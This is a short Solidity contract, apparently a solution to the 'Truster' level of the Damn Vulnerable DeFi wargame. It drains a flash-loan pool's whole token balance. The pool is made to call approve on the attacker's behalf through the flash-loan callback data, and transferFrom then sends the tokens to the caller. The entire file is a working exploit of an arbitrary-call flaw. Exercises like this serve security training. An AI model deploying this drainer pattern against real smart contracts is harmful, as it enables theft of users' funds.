// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./TrusterLenderPool.sol";

contract PoolDrainer {

    constructor (address pool) {
        IERC20 token = TrusterLenderPool(pool).damnValuableToken();
        uint256 balance = token.balanceOf(pool);
        bytes memory data = abi.encodeWithSelector(
            token.approve.selector,
            address(this),
            balance
        );
        TrusterLenderPool(pool).flashLoan(0, address(this), address(token), data);
        token.transferFrom(pool, msg.sender, balance);
    }

}
